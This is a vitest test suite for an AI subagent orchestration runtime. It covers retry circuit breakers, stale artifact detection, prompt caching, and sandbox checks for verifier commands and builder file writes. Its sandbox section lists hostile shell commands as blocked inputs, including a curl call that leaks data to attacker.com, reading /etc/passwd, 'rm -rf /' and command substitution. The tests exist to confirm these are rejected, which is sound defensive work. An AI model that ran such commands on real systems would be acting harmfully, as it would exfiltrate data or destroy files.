import { describe, it, expect } from 'vitest';
import {
  type BotTaskEnvelopeV3,
  type IntraBotSubagentEnvelope,
  type IntraBotBatchRequest,
  PromptSerializer,
  RuntimeHarness,
  IntraBotSubagentManager,
  type GroupedSubagentBatch,
} from './index.ts';

describe('Apex E2E QA Adversarial & Fuzzing Suite: Orchestration v3/v3.1', () => {
  const baseEnvelope: BotTaskEnvelopeV3 = {
    parentTaskId: 'TASK-CORE-999',
    expectedBlackboardVersion: 10,
    idempotencyKey: 'subtask-adv:attempt-1',
    limits: {
      maxExecutionTokens: 32000,
      maxToolCalls: 50,
      timeoutMs: 120000,
    },
    subtaskId: 'subtask-adv',
    attempt: 1,
    tier: 'T3_CRITICAL',
    goal: 'Run critical financial settlement transaction validation',
    executionProfile: {
      kind: 'ENGINEERING',
      worktreePath: 'C:\\Users\\frank\\AppData\\Local\\Temp\\worktree-qa',
      branchName: 'feature/settlement-core',
      softDiffWarningLines: 800,
    },
    context: {
      upstreamSlices: {
        accountId: 'acc_888999',
        balanceCents: 5000000,
      },
      contractRules: [
        'Atomic execution required',
        'Idempotency key strictly required on all ledger entries',
      ],
      forbiddenScope: ['src/billing/legacy/*', 'config/secrets.json'],
    },
    artifactPointers: [
      {
        id: 'ART-LEDGER',
        summary: 'Core ledger schema definition',
        uri: 'file:///workspace/models/ledger.ts',
        sha256: 'a'.repeat(64),
        lineRange: 'L1-L100',
      },
      {
        id: 'ART-RULES',
        summary: 'Business compliance rules',
        uri: 'file:///workspace/docs/compliance.md',
        sha256: 'b'.repeat(64),
      },
    ],
    acceptanceCriteria: {
      outputSchemaName: 'SubBotLLMOutputSchema',
      verifierType: 'CODE_TEST',
      checks: ['pnpm test:ledger', 'pnpm test:e2e-settlement'],
    },
  };

  describe('1. Strike State Machine: Two-Strike Circuit Breaker Invariant', () => {
    it('handles Strike 0 -> Strike 1 transition on verification failure', () => {
      const delta = RuntimeHarness.processHandoff({
        envelope: baseEnvelope,
        currentStrikeCount: 0,
        rawLLMOutput: { outcome: 'COMPLETED' },
        durationMs: 1200,
        inputTokens: 5000,
        cachedInputTokens: 4000,
        outputTokens: 150,
        verificationFn: () => ({
          passed: false,
          verifierType: 'CODE_TEST',
          summary: 'Unit test failed: debit negative amount assertion.',
          errorSnippet: 'AssertionError: Balance cannot go below zero',
        }),
      });

      expect(delta.status).toBe('NEED_RETRY');
      expect(delta.strikeCount).toBe(1);
      expect(delta.verification.passed).toBe(false);
      expect(delta.diagnostics?.errorSnippet).toContain('AssertionError');
    });

    it('enforces CIRCUIT_BROKEN at Strike 2 and blocks 3rd blind retry', () => {
      const delta = RuntimeHarness.processHandoff({
        envelope: { ...baseEnvelope, attempt: 2 },
        currentStrikeCount: 1, // Already struck once
        rawLLMOutput: { outcome: 'COMPLETED' },
        durationMs: 1500,
        inputTokens: 5200,
        cachedInputTokens: 4100,
        outputTokens: 180,
        verificationFn: () => ({
          passed: false,
          verifierType: 'CODE_TEST',
          summary: 'Second attempt failed again: deadlock in transaction.',
        }),
      });

      expect(delta.status).toBe('CIRCUIT_BROKEN');
      expect(delta.strikeCount).toBe(2);
      expect(delta.verification.passed).toBe(false);
    });

    it('caps strikeCount at 2 when invoked with existing Strike 2', () => {
      const delta = RuntimeHarness.processHandoff({
        envelope: { ...baseEnvelope, attempt: 2 },
        currentStrikeCount: 2,
        rawLLMOutput: { outcome: 'COMPLETED' },
        durationMs: 800,
        inputTokens: 2000,
        cachedInputTokens: 1500,
        outputTokens: 50,
        verificationFn: () => ({
          passed: false,
          verifierType: 'CODE_TEST',
          summary: 'Repeated failure beyond strike limit.',
        }),
      });

      expect(delta.status).toBe('CIRCUIT_BROKEN');
      expect(delta.strikeCount).toBe(2);
    });

    it('schema failure triggers strike increment and trips circuit breaker if strike=1', () => {
      const invalidLLMOutput = {
        outcome: 'UNKNOWN_STATUS_CODE',
        arbitraryField: 12345,
      };

      const delta = RuntimeHarness.processHandoff({
        envelope: { ...baseEnvelope, attempt: 2 },
        currentStrikeCount: 1,
        rawLLMOutput: invalidLLMOutput,
        durationMs: 900,
        inputTokens: 3000,
        cachedInputTokens: 2000,
        outputTokens: 40,
      });

      expect(delta.status).toBe('CIRCUIT_BROKEN');
      expect(delta.strikeCount).toBe(2);
      expect(delta.verification.verifierType).toBe('SCHEMA_RULE');
      expect(delta.verification.passed).toBe(false);
    });

    it('sanitizes oversized errorSnippet and summary beyond max boundaries', () => {
      const hugeSnippet = 'X'.repeat(5000);
      const hugeSummary = 'S'.repeat(1000);

      const delta = RuntimeHarness.processHandoff({
        envelope: baseEnvelope,
        currentStrikeCount: 0,
        rawLLMOutput: { outcome: 'COMPLETED' },
        durationMs: 1000,
        inputTokens: 1000,
        cachedInputTokens: 800,
        outputTokens: 50,
        verificationFn: () => ({
          passed: false,
          verifierType: 'CODE_TEST',
          summary: hugeSummary,
          errorSnippet: hugeSnippet,
        }),
      });

      expect(delta.status).toBe('NEED_RETRY');
      expect(delta.verification.summary.length).toBeLessThanOrEqual(400);
      expect(delta.diagnostics?.errorSnippet.length).toBeLessThanOrEqual(2048);
    });
  });

  describe('2. CONTRACT_CONFLICT & STALE_POINTER Zero-Penalty Invariants', () => {
    it('CONTRACT_CONFLICT preserves existing strike count without burning retries', () => {
      const delta1 = RuntimeHarness.processHandoff({
        envelope: baseEnvelope,
        currentStrikeCount: 0,
        rawLLMOutput: {
          outcome: 'CONTRACT_CONFLICT',
          conflictEvidence: 'Upstream schema states accountId is UUID, but sample data is numeric.',
        },
        durationMs: 800,
        inputTokens: 2500,
        cachedInputTokens: 2000,
        outputTokens: 75,
      });

      expect(delta1.status).toBe('CONTRACT_CONFLICT');
      expect(delta1.strikeCount).toBe(0); // Zero penalty
      expect(delta1.diagnostics?.conflictEvidence).toContain('accountId is UUID');

      // Even if already on Strike 1, encountering CONTRACT_CONFLICT does not escalate to Strike 2
      const delta2 = RuntimeHarness.processHandoff({
        envelope: { ...baseEnvelope, attempt: 2 },
        currentStrikeCount: 1,
        rawLLMOutput: {
          outcome: 'CONTRACT_CONFLICT',
          conflictEvidence: 'Secondary conflict identified in ledger spec.',
        },
        durationMs: 850,
        inputTokens: 2600,
        cachedInputTokens: 2100,
        outputTokens: 80,
      });

      expect(delta2.status).toBe('CONTRACT_CONFLICT');
      expect(delta2.strikeCount).toBe(1); // Not escalated to CIRCUIT_BROKEN!
    });

    it('STALE_POINTER detects missing artifact target and does not penalize model', () => {
      const mockResolver = {
        resolve: (uri: string) => {
          if (uri.includes('ledger.ts')) {
            return { exists: false }; // Missing file
          }
          return { exists: true, sha256: 'b'.repeat(64) };
        },
      };

      const delta = RuntimeHarness.processHandoff({
        envelope: baseEnvelope,
        currentStrikeCount: 1,
        rawLLMOutput: { outcome: 'COMPLETED' },
        durationMs: 300,
        inputTokens: 1000,
        cachedInputTokens: 900,
        outputTokens: 30,
        artifactResolver: mockResolver,
      });

      expect(delta.status).toBe('STALE_POINTER');
      expect(delta.strikeCount).toBe(1); // Retains 1, does NOT burn strike 2
      expect(delta.verification.summary).toContain('ART-LEDGER');
    });

    it('STALE_POINTER detects hash mutation and triggers refresh cleanly', () => {
      const mockResolver = {
        resolve: (uri: string) => {
          if (uri.includes('compliance.md')) {
            return { exists: true, sha256: 'mutated_hash_'.padEnd(64, '0') };
          }
          return { exists: true, sha256: 'a'.repeat(64) };
        },
      };

      const delta = RuntimeHarness.processHandoff({
        envelope: baseEnvelope,
        currentStrikeCount: 0,
        rawLLMOutput: { outcome: 'COMPLETED' },
        durationMs: 300,
        inputTokens: 1000,
        cachedInputTokens: 900,
        outputTokens: 30,
        artifactResolver: mockResolver,
      });

      expect(delta.status).toBe('STALE_POINTER');
      expect(delta.strikeCount).toBe(0);
      expect(delta.verification.summary).toContain('ART-RULES');
    });
  });

  describe('3. VERIFIER & BUILDER Security & Sandbox Boundaries', () => {
    const verifierAllowed = ['pnpm test', 'pnpm vitest', 'pnpm tsc -b', 'cargo test'];

    it('allows legitimate verifier commands with arguments', () => {
      expect(IntraBotSubagentManager.isCommandAllowedForVerifier('pnpm test --run', verifierAllowed).allowed).toBe(true);
      expect(IntraBotSubagentManager.isCommandAllowedForVerifier('pnpm vitest src/auth', verifierAllowed).allowed).toBe(true);
      expect(IntraBotSubagentManager.isCommandAllowedForVerifier('pnpm tsc -b', verifierAllowed).allowed).toBe(true);
    });

    it('blocks malicious shell injection and operator chaining in verifier', () => {
      const maliciousCases = [
        'pnpm test; cat /etc/passwd',
        'pnpm test && curl http://attacker.com/leak',
        'pnpm test || shutdown /s',
        'pnpm test | grep token',
        'pnpm test > /dev/null',
        'pnpm test < input.txt',
        'pnpm test `whoami`',
        'pnpm test $(id)',
      ];

      for (const cmd of maliciousCases) {
        const result = IntraBotSubagentManager.isCommandAllowedForVerifier(cmd, verifierAllowed);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('forbidden shell operator');
      }
    });

    it('blocks unlisted binaries and shell builtins in verifier', () => {
      const unlisted = [
        'rm -rf /',
        'powershell -Command "Get-Process"',
        'bash -c "echo hacked"',
        'npm install malicious-pkg',
        'git commit -am "bypass"',
      ];

      for (const cmd of unlisted) {
        const result = IntraBotSubagentManager.isCommandAllowedForVerifier(cmd, verifierAllowed);
        expect(result.allowed).toBe(false);
        expect(result.reason).toContain('does not match any allowed command prefix');
      }
    });

    it('strictly isolates DISJOINT_BUILDER writes and protects forbidden shared root files', () => {
      const projectRoot = 'C:\\workspace\\my-app';
      const allowedPrefixes = [`${projectRoot}\\src\\features\\billing`];
      const forbiddenFiles = ['package.json', 'pnpm-lock.yaml', 'tsconfig.json', 'src\\index.ts'];

      // Legitimate write inside allowed feature module
      const okWrite = IntraBotSubagentManager.isPathAllowedForBuilder(
        `${projectRoot}\\src\\features\\billing\\calculator.ts`,
        allowedPrefixes,
        forbiddenFiles
      );
      expect(okWrite.allowed).toBe(true);

      // Attempt to modify forbidden shared package.json
      const forbiddenWrite = IntraBotSubagentManager.isPathAllowedForBuilder(
        `${projectRoot}\\package.json`,
        allowedPrefixes,
        forbiddenFiles
      );
      expect(forbiddenWrite.allowed).toBe(false);
      expect(forbiddenWrite.reason).toContain('forbidden for builder');

      // Attempt to write outside allowed directory
      const outsideWrite = IntraBotSubagentManager.isPathAllowedForBuilder(
        `${projectRoot}\\src\\auth\\tokens.ts`,
        allowedPrefixes,
        forbiddenFiles
      );
      expect(outsideWrite.allowed).toBe(false);
      expect(outsideWrite.reason).toContain('outside allowed write prefixes');
    });
  });

  describe('4. Prompt Sanitization & Cache Breakpoint Stability', () => {
    it('guarantees that mutating pure metadata leaves fullPrompt and prefixHash 100% invariant', () => {
      const envA: BotTaskEnvelopeV3 = { ...baseEnvelope };
      const envB: BotTaskEnvelopeV3 = {
        ...baseEnvelope,
        expectedBlackboardVersion: 9999, // Mutated
        idempotencyKey: 'completely-different-key:attempt-9', // Mutated
        limits: {
          maxExecutionTokens: 999999,
          maxToolCalls: 999,
          timeoutMs: 999999,
        },
      };

      const opts = {
        staticRoleDefinition: 'System Architect Persona v3',
        frozenMasterContextSnapshot: 'Master System Blueprint v3.1',
      };

      const promptA = PromptSerializer.serialize(envA, opts);
      const promptB = PromptSerializer.serialize(envB, opts);

      // Prefix hash and full prompt MUST remain completely byte-for-byte identical!
      expect(promptA.prefixHash).toBe(promptB.prefixHash);
      expect(promptA.fullPrompt).toBe(promptB.fullPrompt);
      expect(promptA.l0).toBe(promptB.l0);
      expect(promptA.l1).toBe(promptB.l1);
      expect(promptA.l2).toBe(promptB.l2);
    });

    it('ensures raw 64-char sha256 and internal URI are never leaked into prompt text', () => {
      const prompt = PromptSerializer.serialize(baseEnvelope, {
        staticRoleDefinition: 'Persona',
      });

      expect(prompt.fullPrompt).not.toContain('a'.repeat(64));
      expect(prompt.fullPrompt).not.toContain('b'.repeat(64));
      expect(prompt.fullPrompt).not.toContain('file:///workspace/models/ledger.ts');
      expect(prompt.fullPrompt).toContain('ART-LEDGER');
      expect(prompt.fullPrompt).toContain('ART-RULES');
    });
  });

  describe('5. Staggered Cache Warmup (Wait-for-TTFT) & Batching', () => {
    it('groups subagents by distinct (modelId + prefixHash) pairs', () => {
      const scoutTask: IntraBotSubagentEnvelope = {
        ...baseEnvelope,
        invocationScope: 'INTRA_SUBAGENT',
        maxDepth: 1,
        isolationPolicy: {
          role: 'SCOUT',
          allowFileWriteTools: false,
        },
      };

      const batch: IntraBotBatchRequest = {
        concurrencySlotLimit: 3,
        cacheWarmup: { enabled: true, waitForFirstTokenMsCap: 2000 },
        tasks: [
          { ...scoutTask, subtaskId: 't1' },
          { ...scoutTask, subtaskId: 't2' },
          { ...scoutTask, subtaskId: 't3' },
          { ...scoutTask, subtaskId: 't4' },
        ],
      };

      // Two tasks target modelA with prefixA, two target modelB with prefixB
      const groups = IntraBotSubagentManager.groupBatchByPrefix(batch, (task: IntraBotSubagentEnvelope) => {
        if (task.subtaskId === 't1' || task.subtaskId === 't2') {
          return { modelId: 'gemini-3.8-flash', prefixHash: 'hash-alpha' };
        }
        return { modelId: 'claude-3.7-sonnet', prefixHash: 'hash-beta' };
      });

      expect(groups.length).toBe(2);
      expect(groups.find((g: GroupedSubagentBatch) => g.modelId === 'gemini-3.8-flash')?.tasks.length).toBe(2);
      expect(groups.find((g: GroupedSubagentBatch) => g.modelId === 'claude-3.7-sonnet')?.tasks.length).toBe(2);
    });
  });
});
